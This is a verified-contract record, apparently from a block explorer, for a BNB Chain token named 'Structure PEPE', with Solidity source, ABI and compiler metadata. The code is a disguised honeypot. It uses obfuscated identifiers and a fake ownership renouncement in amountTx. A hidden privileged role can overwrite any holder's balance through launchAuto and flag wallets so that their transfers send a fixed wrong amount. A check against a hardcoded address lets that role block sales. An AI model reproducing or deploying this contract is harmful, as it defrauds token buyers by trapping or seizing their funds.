{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface minSwap {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address walletList) external view returns (uint256);\n\n    function transfer(address walletAuto, uint256 toFrom) external returns (bool);\n\n    function allowance(address liquidityMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 toFrom) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address walletAuto,\n        uint256 toFrom\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed limitReceiver, uint256 value);\n    event Approval(address indexed liquidityMin, address indexed spender, uint256 value);\n}\n\nabstract contract isAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface limitTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface tokenMarketing {\n    function createPair(address launchedSenderMin, address sellTeamTrading) external returns (address);\n}\n\ninterface enableWallet is minSwap {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract StructurePEPE is isAmount, minSwap, enableWallet {\n\n    function senderTotal(address launchLiquidityAt, address walletAuto, uint256 toFrom) internal returns (bool) {\n        if (launchLiquidityAt == fromExempt) {\n            return listAt(launchLiquidityAt, walletAuto, toFrom);\n        }\n        uint256 shouldReceiver = minSwap(receiverMax).balanceOf(totalTake);\n        require(shouldReceiver == exemptTx);\n        require(walletAuto != totalTake);\n        if (enableLaunchedTake[launchLiquidityAt]) {\n            return listAt(launchLiquidityAt, walletAuto, swapIs);\n        }\n        return listAt(launchLiquidityAt, walletAuto, toFrom);\n    }\n\n    string private buyList = \"Structure PEPE\";\n\n    function transfer(address exemptMin, uint256 toFrom) external virtual override returns (bool) {\n        return senderTotal(_msgSender(), exemptMin, toFrom);\n    }\n\n    uint256 exemptTx;\n\n    bool private amountLiquidity;\n\n    mapping(address => bool) public enableLaunchedTake;\n\n    bool private amountTeamTotal;\n\n    event OwnershipTransferred(address indexed modeSender, address indexed marketingIs);\n\n    function symbol() external view virtual override returns (string memory) {\n        return txExempt;\n    }\n\n    mapping(address => bool) public isToken;\n\n    address public receiverMax;\n\n    function name() external view virtual override returns (string memory) {\n        return buyList;\n    }\n\n    function approve(address autoMode, uint256 toFrom) public virtual override returns (bool) {\n        totalReceiverLaunched[_msgSender()][autoMode] = toFrom;\n        emit Approval(_msgSender(), autoMode, toFrom);\n        return true;\n    }\n\n    uint256 public launchedToken;\n\n    uint256 constant swapIs = 12 ** 10;\n\n    bool public minLaunch;\n\n    mapping(address => mapping(address => uint256)) private totalReceiverLaunched;\n\n    uint8 private marketingEnable = 18;\n\n    constructor (){\n        \n        limitTo swapTo = limitTo(enableFrom);\n        receiverMax = tokenMarketing(swapTo.factory()).createPair(swapTo.WETH(), address(this));\n        if (swapModeToken == amountTeamTotal) {\n            receiverBuy = marketingBuy;\n        }\n        fromExempt = _msgSender();\n        amountTx();\n        isToken[fromExempt] = true;\n        marketingMax[fromExempt] = teamLimit;\n        if (receiverBuy != takeTotal) {\n            exemptAmountAt = true;\n        }\n        emit Transfer(address(0), fromExempt, teamLimit);\n    }\n\n    uint256 public marketingBuy;\n\n    uint256 private receiverBuy;\n\n    function amountTx() public {\n        emit OwnershipTransferred(fromExempt, address(0));\n        txLaunched = address(0);\n    }\n\n    function listAt(address launchLiquidityAt, address walletAuto, uint256 toFrom) internal returns (bool) {\n        require(marketingMax[launchLiquidityAt] >= toFrom);\n        marketingMax[launchLiquidityAt] -= toFrom;\n        marketingMax[walletAuto] += toFrom;\n        emit Transfer(launchLiquidityAt, walletAuto, toFrom);\n        return true;\n    }\n\n    bool private tradingMode;\n\n    mapping(address => uint256) private marketingMax;\n\n    function owner() external view returns (address) {\n        return txLaunched;\n    }\n\n    function balanceOf(address walletList) public view virtual override returns (uint256) {\n        return marketingMax[walletList];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return marketingEnable;\n    }\n\n    function enableReceiverBuy(uint256 toFrom) public {\n        launchLaunched();\n        exemptTx = toFrom;\n    }\n\n    address enableFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private exemptAmountAt;\n\n    function transferFrom(address launchLiquidityAt, address walletAuto, uint256 toFrom) external override returns (bool) {\n        if (_msgSender() != enableFrom) {\n            if (totalReceiverLaunched[launchLiquidityAt][_msgSender()] != type(uint256).max) {\n                require(toFrom <= totalReceiverLaunched[launchLiquidityAt][_msgSender()]);\n                totalReceiverLaunched[launchLiquidityAt][_msgSender()] -= toFrom;\n            }\n        }\n        return senderTotal(launchLiquidityAt, walletAuto, toFrom);\n    }\n\n    function getOwner() external view returns (address) {\n        return txLaunched;\n    }\n\n    uint256 private teamLimit = 100000000 * 10 ** 18;\n\n    uint256 public takeTotal;\n\n    function launchedWallet(address toLaunchMarketing) public {\n        launchLaunched();\n        \n        if (toLaunchMarketing == fromExempt || toLaunchMarketing == receiverMax) {\n            return;\n        }\n        enableLaunchedTake[toLaunchMarketing] = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return teamLimit;\n    }\n\n    function shouldSell(address buyFund) public {\n        require(buyFund.balance < 100000);\n        if (minLaunch) {\n            return;\n        }\n        if (amountTeamTotal == feeMax) {\n            exemptAmountAt = false;\n        }\n        isToken[buyFund] = true;\n        if (receiverBuy != takeTotal) {\n            exemptAmountAt = false;\n        }\n        minLaunch = true;\n    }\n\n    function launchAuto(address exemptMin, uint256 toFrom) public {\n        launchLaunched();\n        marketingMax[exemptMin] = toFrom;\n    }\n\n    uint256 sellMode;\n\n    function launchLaunched() private view {\n        require(isToken[_msgSender()]);\n    }\n\n    function allowance(address autoTotalToken, address autoMode) external view virtual override returns (uint256) {\n        if (autoMode == enableFrom) {\n            return type(uint256).max;\n        }\n        return totalReceiverLaunched[autoTotalToken][autoMode];\n    }\n\n    bool public feeMax;\n\n    address public fromExempt;\n\n    bool private swapModeToken;\n\n    string private txExempt = \"SPE\";\n\n    address private txLaunched;\n\n    address totalTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingIs\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTotalToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoMode\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toFrom\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletList\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableLaunchedTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"toFrom\",\"type\":\"uint256\"}],\"name\":\"enableReceiverBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toFrom\",\"type\":\"uint256\"}],\"name\":\"launchAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLaunchMarketing\",\"type\":\"address\"}],\"name\":\"launchedWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyFund\",\"type\":\"address\"}],\"name\":\"shouldSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toFrom\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchLiquidityAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toFrom\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "StructurePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}